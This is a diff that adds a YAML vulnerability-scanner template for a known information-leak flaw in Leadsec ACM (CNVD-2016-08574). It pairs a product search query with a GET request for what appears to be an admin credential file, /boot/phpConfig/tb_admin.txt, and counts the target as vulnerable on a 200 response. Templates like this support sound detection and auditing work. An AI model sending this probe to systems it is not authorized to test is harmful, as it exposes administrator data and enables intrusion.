@@ -1,0 +1,21 @@
+name: Leadsec ACM infoleak CNVD-2016-08574
+manual: true
+query: product="Leadsec"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /boot/phpConfig/tb_admin.txt
+      follow_redirects: true
+    expression: response.status == 200
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08574
+  description: Leadsec Online Behavior Management System (Leadsec ACM for short) is
+    a comprehensive solution provided by Leadsec for Internet access users in terms
+    of information content security, network application management, organizational
+    operation efficiency, network resource utilization, legal risk avoidance and network
+    investment return.
+  tags: infoleak
